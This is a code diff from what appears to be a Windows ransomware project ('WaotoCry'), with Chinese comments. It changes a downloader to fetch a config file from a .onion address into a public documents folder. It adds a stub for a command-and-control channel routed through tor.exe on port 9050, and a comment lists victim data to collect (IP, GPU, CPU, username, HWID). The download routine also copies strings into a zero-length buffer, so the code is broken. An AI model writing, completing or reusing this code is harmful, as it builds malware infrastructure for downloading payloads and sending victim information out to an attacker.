@@ -2,17 +2,16 @@
 
 
 
-//http://oh6kf0af4o.great-site.net/download/Config_download/Config.WaotoCry
 
+//lalcuktcocnxehe7e6vgzvhnht6dp7mpuzzzgsizk6ozpqzaczh5o2qd.onion/download/Config_download/Config.WaotoCry
+//string file_Config_dir = "C:\\Users\\Public\\Documents\\dD0bB0";
 
-int downnload(string usl)
-{
-    string download_usl = usl;
-    size_t len = download_usl.length();//获取字符串长度
-    int nmlen = MultiByteToWideChar(CP_ACP, 0, download_usl.c_str(), len + 1, NULL, 0);
-    wchar_t* buffer = new wchar_t[nmlen];
-    MultiByteToWideChar(CP_ACP, 0, download_usl.c_str(), len + 1, buffer, nmlen);
-    HRESULT hr = URLDownloadToFile(NULL, (LPCSTR)buffer, _T("I:\\Project\\C++\\C++_\\0x7E9FB\\Debug\\Config.WaotoCry"), 0, NULL);
+int download(string usl, string file_name) {
+    char all_path[] = "";
+    strcpy(all_path, file_Config_dir.c_str());
+    strcat(all_path, file_name.c_str());
+     char *web = (char*)usl.c_str();
+    HRESULT hr = URLDownloadToFile(NULL, (LPCSTR)web, (LPCSTR)all_path, 0, NULL);
     if (hr == S_OK)
     {
         return 1;
@@ -21,4 +20,18 @@ int downnload(string usl)
     {
         return 0;
     }
+
+}
+
+
+
+//string
+//IP,GPU,CPU,USERNAME,HWID
+
+
+
+
+//套接字通讯 地址为回送:9050 接收进程为:tor.exe
+int Socket_C2_server_information() {
+
 }
